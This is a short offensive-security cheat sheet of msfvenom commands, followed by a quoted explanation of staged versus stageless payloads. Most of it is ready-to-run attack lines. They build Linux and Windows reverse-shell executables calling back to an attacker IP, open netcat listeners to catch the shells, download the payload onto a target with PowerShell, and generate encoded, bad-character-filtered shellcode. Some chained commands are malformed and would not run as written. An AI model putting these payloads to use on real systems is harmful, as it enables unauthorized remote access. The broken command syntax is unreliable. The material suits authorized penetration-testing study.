### Msfvenom
msfvenom --list payloads  
msfvenom --list platforms  
msfvenom --list formats  
msfvenom -p linux/x86/shell_reverse_tcp --list-options  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f elf > shell.elf && nc -lvnp 443 && python -c 'import pty;pty.spawn("/bin/bash")'; && export TERM=xterm  
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f exe > windows_reverse.exe && powershell && Invoke-WebRequest -Uri http://192.168.48.2/windows_reverse.exe -OutFile windows_reverse.exe && nc -lvnp 443  
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.190 LPORT=443 -f py -v shellcode -e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"  
msfvenom -a x86 -p windows/exec cmd=cmd.exe -e x86/shikata_ga_nai -f c -n 10 -b "\x00\x0a\x0d"(non-network-based command execution payloads)(it has service handles the string to raw bytes conversion)  
msfvenom -a x86 -p windows/exec cmd=cmd.exe -e x86/shikata_ga_nai -f raw -n 10 -b "\x00\x0a\x0d"(non-network-based command execution payloads)(it has no service handles the string to raw bytes conversion)  

> The shells shown in this listing all have similar names. The key difference here is the separation after the architecture, of the payload names via a '/' or '_'. The payloads that are separated with a '/' character are staged payloads.6 Staged payloads begin the execution process with a small portion of the code that doesn't contain the full payload.Instead, it initiates the payload download from the attacking host after it begins execution. The benefit of a staged payload is that the size of the file is smaller. This may help with upload limitations on a target host. We will not be working with staged payloads, since that would require us to work with Metasploit.Payloads separated by an underscore (_) are stageless payloads.7 Stageless payloads contain the full payload from MSFvenom and do not require any additional resources from the attacker after initial execution. These payloads are larger when they are produced but often don't require the use of Metasploit to obtain shell access.
